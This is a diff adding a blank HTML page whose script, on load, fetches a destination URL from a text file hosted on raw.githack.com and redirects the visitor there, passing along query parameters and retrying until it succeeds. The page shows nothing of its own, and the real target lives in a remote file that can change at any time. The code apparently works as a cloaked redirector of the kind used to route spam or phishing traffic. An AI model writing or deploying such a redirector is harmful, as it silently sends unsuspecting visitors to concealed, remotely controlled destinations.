@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,11,10,9">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <script src="https://cdn.jsdelivr.net/jquery/1.12.4/jquery.min.js"></script>
+</head>
+
+<body ontouchstart="">
+    <script>
+    function Init() {
+      var q=location.search;
+      var f="";
+      if (q!="") q=q.substr(1);
+      if (q.indexOf("from=")>=0) {f=q.substring(q.indexOf("from=")); q=q.substring(0,q.indexOf("from="));}
+      if (q=="") q="ogHome"; else q=q.replace("name=","").replace("&","");
+      if (f=="") f="ogHomeo"; else f=f.replace("from=","").replace("&","");
+      Load(q,f);
+    }
+
+    function Load(q,f) {
+        jQuery.ajax({
+          url: "https://raw.githack.com/otiny/up/master/show.htm?"+Math.floor(Math.random()*90000000+10000000),
+          dataType: "text",
+          timeout: 16000,
+        })
+        .done(function(data) {
+          u=data.replace("\n","").replace("?","?"+q+"&")+"&from="+f;
+          window.location.href=u;
+        })
+        .fail(function() {
+          setTimeout(function(){Load(q,f);},2000);
+        });
+    }
+    Init();
+    </script>
+</body>
+</html>
